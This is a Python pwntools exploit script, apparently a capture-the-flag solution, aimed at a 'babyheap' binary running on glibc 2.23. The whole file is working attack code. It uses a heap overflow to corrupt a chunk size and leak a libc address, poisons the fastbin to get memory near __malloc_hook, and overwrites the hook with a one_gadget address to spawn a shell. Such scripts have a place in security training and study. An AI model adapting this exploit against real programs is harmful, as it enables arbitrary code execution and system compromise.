#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./babyheap")
libc = ELF("./libc-2.23.so")
env = {"LD_PRELOAD":"./libc-2.23.so"}
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
#context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
#context.aslr = False

global io
breakpoints = '''
break *0x55555540116c
'''+"continue\n"*18

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path, env=env)
else:
    io = gdb.debug(exe.path, env=env,gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def allocate(size,shell=False):
    sla("Command: ", "1")
    sla("Size: ", str(size))
    if shell:
        return
    reu("Index ")
    return str(re(1))

def fill(index,content):
    sla("Command: ", "2")
    sla("Index: ", str(index))
    sla("Size: ", str(len(content)))
    sla("Content: ", content)

def free(index):
    sla("Command: ", "3")
    sla("Index: ", str(index))

def dump(index):
    sla("Command: ", "4")
    sla("Index: ", str(index))
    reu("Content: \n")

a = allocate(0x78)
b = allocate(0x78)
c = allocate(0x78)
d = allocate(0x78)

fill(a,"A"*0x78+"\x01\x01") # Overwrite size(b)=0x101
free(b)

b = allocate(0x78)
dump(c)

libc.address = unpack(re(6),48)-0x3c4b78
log.info("Libc -> "+hex(libc.address))

malloc_hook = libc.symbols["__malloc_hook"]-0x23
log.info(hex(malloc_hook))

d = allocate(0x78)


e = allocate(0x68)
f = allocate(0x68)
g = allocate(0x68)
h = allocate(0x68)
i = allocate(0x18)

free(h)
free(g)

fill(f,flat([
    "A"*0x68,
    0x71,
    malloc_hook
    ]))

x = allocate(0x68)
y = allocate(0x68)

fill(y,"A"*0x13+p64(libc.address+0x4526a))

allocate(0x1337,True)

io.interactive()